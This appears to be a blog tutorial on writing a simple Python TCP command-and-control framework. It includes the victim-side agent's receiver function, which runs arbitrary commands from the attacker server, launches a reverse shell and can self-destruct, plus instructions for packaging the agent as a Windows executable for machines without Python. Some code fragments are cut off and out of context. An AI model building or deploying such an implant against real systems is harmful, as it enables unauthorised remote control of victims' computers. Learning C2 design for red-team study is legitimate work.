Back in the good ole days of my adolescence, I was fascinated with all things Metasploit.  I was a ripe old teenager when Metasploit first came out, and I was enamored by it's inginuity and multifaceted offerings.  You could simply use it to get a shell, or exploit an unwitting victim using a known vulnerability.  Heck, you could (and still can) use it to generate shellcode, escalate privileges, pivot across the compromised network, loot passwords, and all contained within a simple, modest piece of software.  Why do I tell you all of this?

Because if it wasn't for Metasploit, I likely would have never became interested in Cybersecurity at all.  It was the pivotal moment in my life when everything started to click, at least in terms of my aspirations as certified IT geek.  I wanted a challenge, I wanted to understand windows internals more, learn C/C++, assembly,  privilege escalation.  Metasploit was the key to all of it.  Well, that leads us into the reason you're here reading this today.  I knew one day I'd want to learn how to develop my own C2 framework, and what an honor it is to present just that to you starting today! I get to teach you how to code something that was the very fabric of my beginnings in cybersecurity.  I'm thrilled to dive in and explore this with all of you.  Let's get started, cool?!  😸

> Now, first things first.  Don't expect this to be Havoc, Cobalt Strike, Slither, Brute Ratel, or any other number of excellent C2 frameworks out there today.  This will bear a crude resemblance to Metasploit at best, and console / text based.  My aim is to teach you how to code a C2, not replace the already excellent ones out there today.  This is a non-encrypted, very basic TCP socket based C2.  It's meant to be simple and easy to learn.  Okay, with that disclaimer behind us, let's go!

handler_thread.daemon=True
handler_thread.start()

while True:

```

***The "Receiving of Commands" Function***
-

Some of the info below may look confusing at first, but we will fill in the blanks.  The server / attacker box will be capable of sending the following commands at the moment:

- **msg**: Sends a basic message to the client
- **getuserinfo**: gets os, ip, iselevated, user info
- **whoami**: This tells us who the active user is for this shell.
- **shell**: Initiates a reverse shell!
- **command**: issues a curl command to get our victim's public IP
- **self-destruct**: kills the agent/zombie

```python
def receiver(client):

    while True:
        try:
            #this checks to see if the agent is still alive and receiving data
            data=client.recv(1024)
        except:
            print("server must have died...time to hop off")
            client.close()
            os._exit(0)
        data=data.decode('UTF-8') #get the commands we're sending from the attacker box

        if ":msg:" in data:
            print(data)
        if ":whoami:" in data:
            whoami=os.getlogin()
            client.send(whoami.encode())

        if ":shell:" in data: #start the reverse shell!
            exit_event.clear()

            handler_thread2 = threading.Thread(target=startrevshellcli)
            handler_thread2.daemon = True
            handler_thread2.start()
            while not exit_event.is_set():
                time.sleep(1)
        if "c0mm@nd" in data: #does a curl ifconfig.me to get public ip
            command=data.split("\n")
            command=command[1]
            print("command: ", command)
            proc = subprocess.Popen(command,
                            stdin=subprocess.PIPE,
                            stdout=subprocess.PIPE,
                            stderr=subprocess.PIPE)
            client.send(b"returned output: \n"+proc.stdout.read())
            proc.stdin.close()
            proc.terminate()

        if "self-destruct" in data: #kill the agent!
            client.close()
            os._exit(0)
```

Okay, so the `Client` was easy.  The `Server`, which is our main command and control center, is a bit more complex.  I'm running the server code on Linux btw.  Feel free to run it on Windows if you're so inclined.  it'll work but it's a bit buggy at the moment.  I've tried to include some checks to help make things cooperate nicely, where it's operating system agnostic. 😄

You may be thinking to yourself,"But...how can I get this to execute on a windows machine that isn't running python?"  It's a fair question!  I'm sure some folks will knock `pyinstaller`, but it does the job just fine.

> **pyinstaller --onefile --icon=icon.ico your_script.py**

Now you have an .exe that can be used without the need to have python installed.
